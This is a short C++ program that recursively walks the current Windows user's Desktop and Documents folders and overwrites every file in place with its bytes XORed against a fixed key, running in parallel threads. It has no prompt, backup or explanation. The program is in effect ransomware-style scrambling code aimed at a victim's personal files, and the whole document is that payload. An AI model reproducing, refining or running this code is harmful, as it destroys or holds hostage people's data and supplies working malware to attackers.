#include <iostream>
#include <fstream>
#include <filesystem>
#include <future>
#include <vector>
namespace fs = std::filesystem;
void xorFile(const std::string& filePath, int xorKey) {
    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) {
     
        return;
    }

    // Get the length of the file
    inputFile.seekg(0, std::ios::end);
    std::streampos fileSize = inputFile.tellg();
    inputFile.seekg(0, std::ios::beg);

    // Read the file contents into a buffer
    std::string buffer(fileSize, '\0');
    inputFile.read(&buffer[0], fileSize);
    inputFile.close();

    // XOR each byte in the buffer with the XOR key
    for (char& byte : buffer) {
        byte ^= xorKey;
    }

    // Write the modified buffer back to the file
     
    std::ofstream outputFile(filePath, std::ios::binary | std::ios::trunc);


    if (!outputFile) {
      
        return;
    }

    outputFile.write(buffer.c_str(), buffer.size());
    outputFile.close();

   
}
void xorFiles(const fs::path& dir_path, int level = 0) {
    std::vector<std::future<void>> futures;
    for (const auto& entry : fs::directory_iterator(dir_path)) {
        if (fs::is_directory(entry.path())) {
            xorFiles(entry.path(), level + 1);
        } else {
            std::cout << entry.path().string() << std::endl;
            futures.push_back(std::async(std::launch::async, xorFile, entry.path().string(), 12));
        }
    }

    // Wait for all asynchronous tasks to finish
    for (auto& future : futures) {
        future.wait();
    }
}
int main() {
    std::string desktop_path = (fs::path(getenv("USERPROFILE")) / "Desktop").string();
    xorFiles(desktop_path);
    std::string document_path = (fs::path(getenv("USERPROFILE")) / "Documents").string();
    xorFiles(document_path);
    return 0;
}
